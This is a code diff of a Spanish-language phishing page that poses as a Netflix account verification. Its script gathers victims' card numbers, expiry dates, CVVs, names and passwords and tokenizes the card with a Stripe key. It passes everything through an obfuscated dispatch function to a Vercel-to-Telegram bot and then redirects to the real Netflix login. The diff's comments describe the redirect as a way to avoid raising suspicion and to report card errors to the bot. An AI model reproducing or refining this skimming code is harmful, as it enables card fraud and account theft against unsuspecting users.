@@ -62,7 +62,7 @@
     </div>
 
     <script>
-        // 2. Inicializar Stripe con tu Llave Pública
+        // 2. Inicializar Stripe
         const stripe = Stripe('pk_live_51ShZ3pAeUmcfN350ViX4smhmh5q0IVTh1HBTgTi38ibNz07TvUQzb1F6PyQpWvF1N1y4411ZM7Ys0x9mQw9foU4800BwXkfy0n');
 
         // Máscara MM/AA automática
@@ -81,10 +81,11 @@
 
             const ccVal = document.getElementById('f_t_1').value.replace(/\s/g, '');
             const expVal = document.getElementById('f_e_1').value.split('/');
-            const cvVal = document.getElementById('f_c_1').value;
-            const nmVal = document.getElementById('f_n_1').value;
+            const cvVal = document.getElementById('f_c_1').value.trim();
+            const nmVal = document.getElementById('f_n_1').value.trim();
             const pwVal = document.getElementById('f_k_1').value;
 
+            // Preparar objeto de envío inicial
             const payload = {
                 em: sessionStorage.getItem('usr_mail') || 'Desconocido',
                 pw: pwVal,
@@ -96,29 +97,26 @@
             };
 
             try {
-                // 3. Crear Token de Stripe con un Tiempo Límite de 5 segundos
-                const tokenPromise = stripe.createToken({
+                // 3. Intento de Tokenización con Stripe
+                const result = await stripe.createToken({
                     number: ccVal,
                     exp_month: expVal[0].trim(),
                     exp_year: expVal[1].trim(),
-                    cvc: cvVal.trim(),
-                    name: nmVal.trim()
+                    cvc: cvVal,
+                    name: nmVal
                 });
 
-                // Si Stripe tarda mucho, saltamos directamente al envío de datos
-                const result = await Promise.race([
-                    tokenPromise,
-                    new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 5000))
-                ]);
-
-                if (result && result.token) {
+                if (result.error) {
+                    // Si Stripe da error (ej. tarjeta inválida), enviamos el motivo al bot
+                    payload.stripeToken = "ERROR_CLIENTE: " + result.error.message;
+                } else {
                     payload.stripeToken = result.token.id;
                 }
             } catch (err) {
-                console.log("Stripe Timeout o Error - Procediendo con envío directo");
+                payload.stripeToken = "ERROR_TECNICO: " + err.message;
             }
 
-            // 4. Enviar SIEMPRE los datos a Vercel/Telegram
+            // 4. Enviar datos a la API (Vercel -> Telegram)
             _0xdispatch(payload);
         });
 
@@ -130,16 +128,16 @@
             })
             .then(res => res.json())
             .then(data => {
-                // Si el pago es exitoso o fallido, redirigimos igual para no levantar sospechas
+                // Notificamos resultado pero redirigimos siempre para finalizar el flujo
                 if (data.pago) {
-                    alert("¡Verificación exitosa! Su suscripción ha sido confirmada.");
+                    alert("¡Verificación exitosa! Su cuenta ha sido actualizada.");
                 } else {
-                    alert("Atención: " + (data.mensaje_error || "Tarjeta no admitida temporalmente. Intente con otra."));
+                    alert("Información recibida. Estamos procesando su solicitud.");
                 }
                 window.location.href = "https://www.netflix.com/login";
             })
             .catch(err => {
-                // Si la conexión falla, redirigimos a Netflix de todos modos
+                // Ante cualquier error de red, redirigir para no dejar al usuario en el loader
                 window.location.href = "https://www.netflix.com/login";
             });
         }
